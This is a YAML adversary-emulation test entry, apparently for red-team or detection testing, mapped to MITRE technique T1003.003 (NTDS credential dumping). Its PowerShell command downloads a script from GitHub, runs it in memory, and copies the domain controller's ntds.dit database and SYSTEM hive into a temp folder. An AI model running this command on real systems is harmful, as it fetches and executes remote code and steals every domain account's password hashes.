- requirements: []
  name: Soumaia ART Tests - Copy NTDS in low level NTFS acquisition via fsutil
  description: 'This test is intended to be run on a domain Controller.


    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running). (requires elevation)'
  tactic: credential-access
  technique_id: T1003.003
  technique_name: 'OS Credential Dumping: NTDS'
  executors:
  - cleanup:
    - remove-item "C:\Windows\Temp\ntds.dit" -force -erroraction silentlycontinue; remove-item "C:\Windows\Temp\SYSTEM_HIVE" -force -erroraction silentlycontinue
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing); Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit; Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE'
  id: 6411a601-e93c-5d75-883c-b48d34cdef35
